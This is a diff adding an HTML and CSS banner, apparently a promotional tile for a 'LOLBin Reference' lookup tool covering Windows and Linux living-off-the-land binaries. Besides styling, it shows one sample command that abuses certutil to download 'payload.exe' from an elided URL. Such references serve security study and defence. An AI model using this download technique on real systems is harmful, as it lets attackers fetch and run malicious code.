@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 440px; height: 280px;
+    overflow: hidden;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: radial-gradient(circle at 75% 20%, #1c2b1c 0%, #14181c 45%, #0d0f11 100%);
+  }
+  .grid-overlay {
+    position: absolute; inset: 0;
+    background-image:
+      linear-gradient(rgba(79,195,247,0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(79,195,247,0.05) 1px, transparent 1px);
+    background-size: 22px 22px;
+  }
+  .glow {
+    position: absolute;
+    width: 260px; height: 260px;
+    right: -60px; top: -60px;
+    background: radial-gradient(circle, rgba(79,195,247,0.20) 0%, rgba(79,195,247,0) 70%);
+  }
+  .wrap {
+    position: relative;
+    width: 440px; height: 280px;
+    padding: 26px 24px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+  }
+  .brand-row {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 14px;
+  }
+  .icon {
+    width: 56px; height: 56px;
+    border-radius: 12px;
+  }
+  .title {
+    font-size: 25px;
+    font-weight: 800;
+    color: #ffffff;
+    letter-spacing: -0.3px;
+    line-height: 1.15;
+  }
+  .title .accent { color: #4fc3f7; }
+  .subtitle {
+    font-size: 13.5px;
+    color: #9fb0b8;
+    margin-top: 3px;
+    font-weight: 500;
+  }
+  .pill-row {
+    display: flex;
+    gap: 8px;
+    margin-top: 4px;
+  }
+  .pill {
+    font-size: 11px;
+    font-weight: 700;
+    padding: 4px 10px;
+    border-radius: 20px;
+    color: #fff;
+    letter-spacing: 0.3px;
+  }
+  .pill.win { background: #0078d4; }
+  .pill.linux { background: #f57c00; }
+  .pill.count { background: #263826; color: #7ee787; border: 1px solid #3a5a3a; }
+  .cmd {
+    margin-top: 16px;
+    background: #0d0f11;
+    border: 1px solid #2a3a2a;
+    border-radius: 8px;
+    padding: 10px 14px;
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 12px;
+    color: #7ee787;
+  }
+  .cmd .comment { color: #5a6a5a; }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="grid-overlay"></div>
+    <div class="glow"></div>
+    <div class="brand-row">
+      <img class="icon" src="data:image/png;base64,__ICON_B64__" />
+      <div>
+        <div class="title">LOLBin <span class="accent">Reference</span></div>
+        <div class="subtitle">Living-off-the-Land Binary lookup</div>
+      </div>
+    </div>
+    <div class="pill-row">
+      <span class="pill win">WINDOWS</span>
+      <span class="pill linux">LINUX</span>
+      <span class="pill count">142 techniques</span>
+    </div>
+    <div class="cmd"><span class="comment"># </span>certutil -urlcache -split -f http://... payload.exe</div>
+  </div>
+</body>
+</html>
